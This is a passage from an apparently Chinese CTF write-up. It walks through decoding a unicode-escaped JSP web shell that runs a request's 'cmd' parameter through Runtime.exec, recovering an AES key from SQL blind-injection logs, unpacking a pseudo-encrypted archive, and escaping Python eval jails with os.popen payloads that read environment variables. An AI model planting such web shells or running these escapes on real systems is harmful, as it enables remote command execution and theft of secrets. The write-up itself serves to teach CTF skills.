class="string">&quot;=&quot;</span> * <span class="number">60</span>)</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># 保存文件</span></span><br><span class="line">    <span class="keyword">if</span> args.save <span class="keyword">or</span> args.output:</span><br><span class="line">        filename = args.output <span class="keyword">if</span> args.output <span class="keyword">else</span> <span class="string">&quot;ascii.txt&quot;</span></span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            <span class="keyword">with</span> <span class="built_in">open</span>(filename, <span class="string">&#x27;w&#x27;</span>, encoding=<span class="string">&#x27;utf-8&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">                f.write(decoded)</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;✓ 已保存到: <span class="subst">&#123;filename&#125;</span>&quot;</span>)</span><br><span class="line">        <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;✗ 保存失败: <span class="subst">&#123;e&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">PS</span> C:\Users\Rekjo\Desktop\misc\useful_scripts&gt; python unicode.py <span class="string">&quot;<span class="variable">$logger</span>.warn(\&quot;</span>\\u003c\\u0025\\u0040\\u0020\\u0070\\u0061\\u0067\\u0065\\u0020\\u0069\\u006d\\u0070\\u006f\\u0072\\u0074\\u003d\\u0022\\u006a\\u0061\\u0076\\u0061\\u002e\\u0075\\u0074\\u0069\\u006c\\u002e\\u002a\\u002c\\u006a\\u0061\\u0076\\u0061\\u002e\\u0069\\u006f\\u002e\\u002a\\u0022\\u0025\\u003e\\u000a\\u003c\\u0068\\u0074\\u006d\\u006c\\u003e\\u000a\\u0020\\u0020\\u0020\\u0020\\u003c\\u0062\\u006f\\u0064\\u0079\\u003e\\u000a\\u0020\\u0020\\u0020\\u0020\\u0020\\u0020\\u0020\\u0020\\u003c\\u0066\\u006f\\u0072\\u006d\\u0020\\u006d\\u0065\\u0074\\u0068\\u006f\\u0064\\u003d\\u0022\\u0067\\u0065\\u0074\\u0022\\u003e\\u000a\\u0009\\u0009\\u003c\\u0069\\u006e\\u0070\\u0075\\u0074\\u0020\\u0074\\u0079\\u0070\\u0065\\u003d\\u0022\\u0074\\u0065\\u0078\\u0074\\u0022\\u0020\\u006e\\u0061\\u006d\\u0065\\u003d\\u0022\\u0063\\u006d\\u0064\\u0022\\u0020\\u0076\\u0061\\u006c\\u0075\\u0065\\u003d\\u0022\\u0066\\u006c\\u0061\\u0067\\u007b\\u0035\\u0037\\u0033\\u0038\\u0039\\u0030\\u0038\\u0034\\u0037\\u0039\\u0030\\u0031\\u0038\\u0034\\u0037\\u0039\\u0038\\u0031\\u0032\\u0037\\u0039\\u0030\\u0038\\u007d\\u0022\\u003e\\u000a\\u0020\\u0020\\u0020\\u0020\\u0020\\u0020\\u0020\\u0020\\u0020\\u0020\\u0020\\u0020\\u003c\\u0069\\u006e\\u0070\\u0075\\u0074\\u0020\\u0074\\u0079\\u0070\\u0065\\u003d\\u0022\\u0073\\u0075\\u0062\\u006d\\u0069\\u0074\\u0022\\u0020\\u0076\\u0061\\u006c\\u0075\\u0065\\u003d\\u0022\\u0053\\u0065\\u006e\\u0064\\u0022\\u003e\\u000a\\u0020\\u0020\\u0020\\u0020\\u0020\\u0020\\u0020\\u0020\\u003c\\u002f\\u0066\\u006f\\u0072\\u006d\\u003e\\u000a\\u0020\\u0020\\u0020\\u0020\\u003c\\u0070\\u0072\\u0065\\u003e\\u000a\\u0020\\u0020\\u0020\\u0020\\u0020\\u0020\\u0020\\u0020\\u003c\\u0025\\u000a\\u0020\\u0020\\u0020\\u0020\\u0020\\u0020\\u0020\\u0020\\u0069\\u0066\\u0020\\u0028\\u0072\\u0065\\u0071\\u0075\\u0065\\u0073\\u0074\\u002e\\u0067\\u0065\\u0074\\u0050\\u0061\\u0072\\u0061\\u006d\\u0065\\u0074\\u0065\\u0072\\u0028\\u0022\\u0063\\u006d\\u0064\\u0022\\u0029\\u0020\\u0021\\u003d\\u0020\\u006e\\u0075\\u006c\\u006c\\u0029\\u0020\\u007b\\u000a\\u0020\\u0020\\u0020\\u0020\\u0020\\u0020\\u0020\\u0020\\u0020\\u0020\\u0020\\u0020\\u006f\\u0075\\u0074\\u002e\\u0070\\u0072\\u0069\\u006e\\u0074\\u006c\\u006e\\u0028\\u0022\\u0043\\u006f\\u006d\\u006d\\u0061\\u006e\\u0064\\u003a\\u0020\\u0022\\u0020\\u002b\\u0020\\u0072\\u0065\\u0071\\u0075\\u0065\\u0073\\u0074\\u002e\\u0067\\u0065\\u0074\\u0050\\u0061\\u0072\\u0061\\u006d\\u0065\\u0074\\u0065\\u0072\\u0028\\u0022\\u0063\\u006d\\u0064\\u0022\\u0029\\u0020\\u002b\\u0020\\u0022\\u003c\\u0042\\u0052\\u003e\\u0022\\u0029\\u003b\\u000a\\u0020\\u0020\\u0020\\u0020\\u0020\\u0020\\u0020\\u0020\\u0020\\u0020\\u0020\\u0020\\u0050\\u0072\\u006f\\u0063\\u0065\\u0073\\u0073\\u0020\\u0070\\u0020\\u003d\\u0020\\u0052\\u0075\\u006e\\u0074\\u0069\\u006d\\u0065\\u002e\\u0067\\u0065\\u0074\\u0052\\u0075\\u006e\\u0074\\u0069\\u006d\\u0065\\u0028\\u0029\\u002e\\u0065\\u0078\\u0065\\u0063\\u0028\\u0072\\u0065\\u0071\\u0075\\u0065\\u0073\\u0074\\u002e\\u0067\\u0065\\u0074\\u0050\\u0061\\u0072\\u0061\\u006d\\u0065\\u0074\\u0065\\u0072\\u0028\\u0022\\u0063\\u006d\\u0064\\u0022\\u0029\\u0029\\u003b\\u000a\\u0020\\u0020\\u0020\\u0020\\u0020\\u0020\\u0020\\u0020\\u0020\\u0020\\u0020\\u0020\\u004f\\u0075\\u0074\\u0070\\u0075\\u0074\\u0053\\u0074\\u0072\\u0065\\u0061\\u006d\\u0020\\u006f\\u0073\\u0020\\u003d\\u0020\\u0070\\u002e\\u0067\\u0065\\u0074\\u004f\\u0075\\u0074\\u0070\\u0075\\u0074\\u0053\\u0074\\u0072\\u0065\\u0061\\u006d\\u0028\\u0029\\u003b\\u000a\\u0020\\u0020\\u0020\\u0020\\u0020\\u0020\\u0020\\u0020\\u0020\\u0020\\u0020\\u0020\\u0049\\u006e\\u0070\\u0075\\u0074\\u0053\\u0074\\u0072\\u0065\\u0061\\u006d\\u0020\\u0069\\u006e\\u0020\\u003d\\u0020\\u0070\\u002e\\u0067\\u0065\\u0074\\u0049\\u006e\\u0070\\u0075\\u0074\\u0053\\u0074\\u0072\\u0065\\u0061\\u006d\\u0028\\u0029\\u003b\\u000a\\u0020\\u0020\\u0020\\u0020\\u0020\\u0020\\u0020\\u0020\\u0020\\u0020\\u0020\\u0020\\u0044\\u0061\\u0074\\u0061\\u0049\\u006e\\u0070\\u0075\\u0074\\u0053\\u0074\\u0072\\u0065\\u0061\\u006d\\u0020\\u0064\\u0069\\u0073\\u0020\\u003d\\u0020\\u006e\\u0065\\u0077\\u0020\\u0044\\u0061\\u0074\\u0061\\u0049\\u006e\\u0070\\u0075\\u0074\\u0053\\u0074\\u0072\\u0065\\u0061\\u006d\\u0028\\u0069\\u006e\\u0029\\u003b\\u000a\\u0020\\u0020\\u0020\\u0020\\u0020\\u0020\\u0020\\u0020\\u0020\\u0020\\u0020\\u0020\\u0053\\u0074\\u0072\\u0069\\u006e\\u0067\\u0020\\u0064\\u0069\\u0073\\u0072\\u0020\\u003d\\u0020\\u0064\\u0069\\u0073\\u002e\\u0072\\u0065\\u0061\\u0064\\u004c\\u0069\\u006e\\u0065\\u0028\\u0029\\u003b\\u000a\\u0020\\u0020\\u0020\\u0020\\u0020\\u0020\\u0020\\u0020\\u0020\\u0020\\u0020\\u0020\\u0077\\u0068\\u0069\\u006c\\u0065\\u0020\\u0028\\u0020\\u0064\\u0069\\u0073\\u0072\\u0020\\u0021\\u003d\\u0020\\u006e\\u0075\\u006c\\u006c\\u0020\\u0029\\u0020\\u007b\\u000a\\u0020\\u0020\\u0020\\u0020\\u0020\\u0020\\u0020\\u0020\\u0020\\u0020\\u0020\\u0020\\u0020\\u0020\\u0020\\u0020\\u006f\\u0075\\u0074\\u002e\\u0070\\u0072\\u0069\\u006e\\u0074\\u006c\\u006e\\u0028\\u0064\\u0069\\u0073\\u0072\\u0029\\u003b\\u0020\\u000a\\u0020\\u0020\\u0020\\u0020\\u0020\\u0020\\u0020\\u0020\\u0020\\u0020\\u0020\\u0020\\u0020\\u0020\\u0020\\u0020\\u0064\\u0069\\u0073\\u0072\\u0020\\u003d\\u0020\\u0064\\u0069\\u0073\\u002e\\u0072\\u0065\\u0061\\u0064\\u004c\\u0069\\u006e\\u0065\\u0028\\u0029\\u003b\\u0020\\u000a\\u0020\\u0020\\u0020\\u0020\\u0020\\u0020\\u0020\\u0020\\u0020\\u0020\\u0020\\u0020\\u0020\\u0020\\u0020\\u0020\\u007d\\u000a\\u0020\\u0020\\u0020\\u0020\\u0020\\u0020\\u0020\\u0020\\u0020\\u0020\\u0020\\u0020\\u007d\\u000a\\u0020\\u0020\\u0020\\u0020\\u0020\\u0020\\u0020\\u0020\\u0025\\u003e\\u000a\\u0020\\u0020\\u0020\\u0020\\u003c\\u002f\\u0070\\u0072\\u0065\\u003e\\u000a\\u0020\\u0020\\u0020\\u0020\\u003c\\u002f\\u0062\\u006f\\u0064\\u0079\\u003e\\u000a\\u003c\\u002f\\u0068\\u0074\\u006d\\u006c\\u003e\\u000a\<span class="string">&quot;)##&quot;</span></span><br><span class="line">============================================================</span><br><span class="line">解码结果：</span><br><span class="line">============================================================</span><br><span class="line">.warn(\ &lt;%<span class="selector-tag">@</span> page import=<span class="string">&quot;java.util.*,java.io.*&quot;</span>%&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">    &lt;body&gt;</span><br><span class="line">        &lt;form method=<span class="string">&quot;get&quot;</span>&gt;</span><br><span class="line">                &lt;input <span class="built_in">type</span>=<span class="string">&quot;text&quot;</span> name=<span class="string">&quot;cmd&quot;</span> value=<span class="string">&quot;flag&#123;57389084790184798127908&#125;&quot;</span>&gt;</span><br><span class="line">            &lt;input <span class="built_in">type</span>=<span class="string">&quot;submit&quot;</span> value=<span class="string">&quot;Send&quot;</span>&gt;</span><br><span class="line">        &lt;/form&gt;</span><br><span class="line">    &lt;pre&gt;</span><br><span class="line">        &lt;%</span><br><span class="line">        <span class="keyword">if</span> (request.getParameter(<span class="string">&quot;cmd&quot;</span>) != null) &#123;</span><br><span class="line">            out.println(<span class="string">&quot;Command: &quot;</span> + request.getParameter(<span class="string">&quot;cmd&quot;</span>) + <span class="string">&quot;&lt;BR&gt;&quot;</span>);</span><br><span class="line">            <span class="keyword">Process</span> p = Runtime.getRuntime().exec(request.getParameter(<span class="string">&quot;cmd&quot;</span>));</span><br><span class="line">            OutputStream os = p.getOutputStream();</span><br><span class="line">            InputStream <span class="keyword">in</span> = p.getInputStream();</span><br><span class="line">            DataInputStream dis = new DataInputStream(<span class="keyword">in</span>);</span><br><span class="line">            String disr = dis.readLine();</span><br><span class="line">            <span class="keyword">while</span> ( disr != null ) &#123;</span><br><span class="line">                out.println(disr);</span><br><span class="line">                disr = dis.readLine();</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        %&gt;</span><br><span class="line">    &lt;/pre&gt;</span><br><span class="line">    &lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br><span class="line">\)<span class="comment">##</span></span><br><span class="line">============================================================</span><br></pre></td></tr></table></figure>
<p><strong>flag{57389084790184798127908}</strong></p>
<p><strong>注：</strong>本题的附件不能用wireshark打开，但有个工具值得注意</p>
<p>根据文件名 443.this.is.mitm.file（暗示端口 443 HTTPS 流量被中间人拦截），这通常是工具 <strong>mitmproxy</strong> 保存的流量转储文件（Flow Dump）。</p>
<p>因为这是“中间人攻击”（MITM）截获的流量，<strong>里面的 HTTPS 流量已经是解密状态</strong>。可以通过以下方式来分析：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">sudo</span> apt install mitmproxy <span class="comment">##kali linux</span></span><br><span class="line">mitmweb -n -r 443.this.is.mitm.file</span><br></pre></td></tr></table></figure>
<p>响应的网页可以在浏览器打开。此工具也可进行类似于wireshark的功能，如过滤、追踪等。</p>
<ul>
<li>EZSqli</li>
</ul>
<blockquote>
<p>简单sqli盲注分析, 但是AES加密</p>
<p>提交flag时把<code>flag{*}</code>替换为<code>CBCTF{*}</code></p>
</blockquote>
<p>notepad看看，里面比较长的若干行还是很醒目的，明显注入了aes_key和iv值</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">extract_aes_key_from_blind_injection</span>(<span class="params">logs</span>):</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 存储每个位置的成功ASCII值</span></span><br><span class="line">    positions = &#123;&#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">for</span> log <span class="keyword">in</span> logs:</span><br><span class="line">        <span class="comment"># 提取位置和ASCII值</span></span><br><span class="line">        <span class="keyword">match</span> = re.search(<span class="string">r&#x27;ASCII\(SUBSTRING\(\(SELECT aes_key FROM sys_conf\),(\d+),1\)\)=\&#x27;(\d+)\&#x27;&#x27;</span>, log)</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">match</span>:</span><br><span class="line">            pos = <span class="built_in">int</span>(<span class="keyword">match</span>.group(<span class="number">1</span>))</span><br><span class="line">            ascii_val = <span class="built_in">int</span>(<span class="keyword">match</span>.group(<span class="number">2</span>))</span><br><span class="line">            </span><br><span class="line">            <span class="comment"># 检查响应大小 - 1280表示成功，100表示失败</span></span><br><span class="line">            <span class="keyword">if</span> <span class="string">&#x27;&quot; 200 1280&#x27;</span> <span class="keyword">in</span> log:</span><br><span class="line">                positions[pos] = ascii_val</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># 按位置排序并转换为字符</span></span><br><span class="line">    aes_key = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">for</span> pos <span class="keyword">in</span> <span class="built_in">sorted</span>(positions.keys()):</span><br><span class="line">        ascii_val = positions[pos]</span><br><span class="line">        aes_key += <span class="built_in">chr</span>(ascii_val)</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> aes_key</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line">    <span class="comment"># 从标准输入读取过滤后的日志</span></span><br><span class="line">    logs = sys.stdin.read().splitlines()</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> logs:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;没有找到攻击日志&quot;</span>)</span><br><span class="line">        <span class="keyword">return</span></span><br><span class="line">    </span><br><span class="line">    aes_key = extract_aes_key_from_blind_injection(logs)</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> aes_key:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;提取的AES密钥: <span class="subst">&#123;aes_key&#125;</span>&quot;</span>)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;密钥长度: <span class="subst">&#123;<span class="built_in">len</span>(aes_key)&#125;</span> 字符&quot;</span>)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;十六进制: <span class="subst">&#123;aes_key.encode().<span class="built_in">hex</span>()&#125;</span>&quot;</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;未能提取AES密钥&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure>
<p>类似方法提取password和iv。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line"></span><br><span class="line">aes_key_hex = <span class="string">&#x27;b1c91fe0fc5af04615230c9196b087ff&#x27;</span></span><br><span class="line">aes_iv = <span class="string">&#x27;61945a9ac62102c6&#x27;</span>  <span class="comment"># 8字节</span></span><br><span class="line">password_hash = <span class="string">&#x27;5a15c26228ae3af44797eaa4426d8fd498f79ecb2059b592903422eaafc355ab4c105a9e7ab6b5a43195266887779269&#x27;</span></span><br><span class="line"></span><br><span class="line">aes_key = <span class="built_in">bytes</span>.fromhex(aes_key_hex)</span><br><span class="line">encrypted_data = <span class="built_in">bytes</span>.fromhex(password_hash)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;最终解密尝试...&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;密钥: <span class="subst">&#123;aes_key_hex&#125;</span>&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;IV: <span class="subst">&#123;aes_iv&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># CTR 模式（支持 8 字节 nonce）</span></span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">    cipher = AES.new(aes_key, AES.MODE_CTR, nonce=<span class="built_in">bytes</span>.fromhex(aes_iv))</span><br><span class="line">    decrypted = cipher.decrypt(encrypted_data)</span><br><span class="line">    result = decrypted.decode(<span class="string">&#x27;utf-8&#x27;</span>, errors=<span class="string">&#x27;ignore&#x27;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;CTR 结果: <span class="subst">&#123;result&#125;</span>&quot;</span>)</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&#x27;flag&#x27;</span> <span class="keyword">in</span> result.lower():</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;🎯 找到 flag!&quot;</span>)</span><br><span class="line"><span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;CTR 失败: <span class="subst">&#123;e&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 如果 CTR 不行，尝试用补全的 IV 进行 CBC</span></span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">    <span class="comment"># 补全 IV 到 16 字节</span></span><br><span class="line">    full_iv = <span class="built_in">bytes</span>.fromhex(aes_iv + <span class="string">&#x27;0000000000000000&#x27;</span>)  <span class="comment"># 补0</span></span><br><span class="line">    cipher = AES.new(aes_key, AES.MODE_CBC, full_iv)</span><br><span class="line">    <span class="keyword">from</span> Crypto.Util.Padding <span class="keyword">import</span> unpad</span><br><span class="line">    decrypted = unpad(cipher.decrypt(encrypted_data), AES.block_size)</span><br><span class="line">    result = decrypted.decode(<span class="string">&#x27;utf-8&#x27;</span>, errors=<span class="string">&#x27;ignore&#x27;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;CBC(补0) 结果: <span class="subst">&#123;result&#125;</span>&quot;</span>)</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&#x27;flag&#x27;</span> <span class="keyword">in</span> result.lower():</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;🎯 找到 flag!&quot;</span>)</span><br><span class="line"><span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;CBC(补0) 失败: <span class="subst">&#123;e&#125;</span>&quot;</span>)</span><br></pre></td></tr></table></figure>
<ul>
<li>C!C!B!</li>
</ul>
<blockquote>
<p>从滚木的手机里发现的文件，里面有什么呢？</p>
</blockquote>
<p>尝试之后发现是伪加密，注意7z看到里面有两个文件，所以一共是2*2=4个标记需要更改。</p>
<p>解密之后，电棍笑传之.txt：</p>
<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">然后我猜你可能需要这个：aHR0cHM6Ly9saGxuYi50b3AvaGFqaW1pL2Jhc2U2NA==</span><br></pre></td></tr></table></figure>
<p>base64解码得到网址：<strong><a target="_blank" rel="noopener" href="https://lhlnb.top/hajimi/base64">https://lhlnb.top/hajimi/base64</a></strong></p>
<p>打开发现是哈基米语解密，解密结果错误</p>
<p>仔细寻找发现网站下方可以设置密钥，一开始眼神不好没看见，试了半天</p>
<p>密钥必然是在C!C!B!.dll里面，拷打AI得到脚本，原理还不清楚</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> ctypes</span><br><span class="line">dll = ctypes.WinDLL(<span class="string">&#x27;./C!C!B!.dll&#x27;</span>)</span><br><span class="line">dll.CCB()</span><br></pre></td></tr></table></figure>
<p>powershell运行可得密码：b31915cd51e064bbaf8d6b2790ba108df10c84358f37033cb83609e78e9a3bfb</p>
<p>得到flag<strong>CBCTF{y0U_4re_tRULY_a_CCB_mA$TEr}</strong></p>
<ul>
<li>py_jail1</li>
</ul>
<blockquote>
<p>时隔一年，JBNRZ 又搬出了他的陈年老题，相信你一定可以秒了它</p>
<p>这一关，你会 <code>python</code> 吗</p>
</blockquote>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">result=<span class="built_in">__import__</span>(<span class="string">&#x27;os&#x27;</span>).popen(<span class="string">&#x27;env | grep -i flag; cat /proc/self/environ | tr &quot;\\0&quot; &quot;\\n&quot; | grep -i flag&#x27;</span>).read()</span><br><span class="line"><span class="built_in">print</span>(result)</span><br></pre></td></tr></table></figure>
<p>FLAG=<strong>CBCTF{YOU_cAn-EX3cUTE_THe_SYYyYYStEM_cOMmAnD}</strong></p>
<ul>
<li>py_jail2</li>
</ul>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">WELCOME = <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string"> _     _______     _______ _       ____  </span></span><br><span class="line"><span class="string">| |   | ____\ \   / / ____| |     |___ \ </span></span><br><span class="line"><span class="string">| |   |  _|  \ \ / /|  _| | |       __) |</span></span><br><span class="line"><span class="string">| |___| |___  \ V / | |___| |___   / __/ </span></span><br><span class="line"><span class="string">|_____|_____|  \_/  |_____|_____| |_____|</span></span><br><span class="line"><span class="string">                                         </span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(WELCOME)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;Welcome to the JBNRZ&#x27;s pyjail&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;I&#x27;m just a calculator, hhhhhh&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;Example: &quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;  input: 1 + 1&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;  Result: 2&quot;</span>)</span><br><span class="line">input_data = <span class="built_in">input</span>(<span class="string">&quot;&gt; &quot;</span>)</span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;Result: &#123;&#125;&quot;</span>.<span class="built_in">format</span>(<span class="built_in">eval</span>(input_data)))</span><br><span class="line"><span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;Result: <span class="subst">&#123;e&#125;</span>&quot;</span>)</span><br></pre></td></tr></table></figure>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">__import__(<span class="string">&#x27;os&#x27;</span>).popen(<span class="string">&#x27;env | grep -i flag; cat /proc/self/environ | tr &quot;\\0&quot; &quot;\\n&quot; | grep -i flag&#x27;</span>).<span class="built_in">read</span>()</span><br><span class="line">Result: FLAG=CBCTF&#123;wEL1_evAL_fUNCCtiON-iS_NOT-SAF3&#125;</span><br></pre></td></tr></table></figure>
<ul>
<li>py_jail4</li>
</ul>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">WELCOME = <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string"> _     _______     _______ _       _____ </span></span><br><span class="line"><span class="string">| |   | ____\ \   / / ____| |     |___ / </span></span><br><span class="line"><span class="string">| |   |  _|  \ \ / /|  _| | |       |_ \ </span></span><br><span class="line"><span class="string">| |___| |___  \ V / | |___| |___   ___) |</span></span><br><span class="line"><span class="string">|_____|_____|  \_/  |_____|_____| |____/ </span></span><br><span class="line"><span class="string">                                         </span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(WELCOME)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;Welcome to the JBNRZ&#x27;s pyjail&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;I&#x27;m just a calculator, hhhhhh.\nohh, this time with a length limit, it&#x27;s more secure!&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;Example: &quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;  input: 1 + 1&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;  Result: 2&quot;</span>)</span><br><span class="line">input_data = <span class="built_in">input</span>(<span class="string">&quot;&gt; &quot;</span>)</span><br><span class="line"><span class="keyword">if</span> <span class="built_in">len</span>(input_data) &gt; <span class="number">13</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span 